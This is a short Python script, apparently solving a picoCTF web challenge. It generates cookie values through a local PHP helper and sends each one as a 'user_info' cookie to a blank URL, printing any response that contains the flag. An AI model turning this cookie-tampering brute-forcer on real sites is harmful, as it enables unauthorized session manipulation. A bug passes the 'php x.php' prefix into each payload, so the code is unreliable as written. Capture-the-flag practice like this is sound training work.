import subprocess
import requests
filepath = 'x.txt'
output = []

def run_command(cmd):
    cmd = "php x.php {}".format(cmd)
    out = subprocess.Popen(['php', 'x.php', cmd], 
           stdout=subprocess.PIPE, 
           stderr=subprocess.STDOUT)
    stdout,stderr = out.communicate()
    output.append(stdout.strip())
    #output.append(out)

with open(filepath) as fp:
   line = fp.readline()
   cnt = 1
   while line:
       if '"' in line.strip():
           run_command("'{}'".format(line.strip()))
          
       else:
           run_command('"{}"'.format(line.strip()))
          
       line = fp.readline()
       cnt += 1

for i in output:
    url = ""
    cookies = dict(user_info=i)
    response = requests.get(url, cookies=cookies)
    print('> Trying this cookie! : {}'.format(i))
    print('----------------')
    if "picoCTF" in response.text:
        print('Found this!')
        print(response.text)
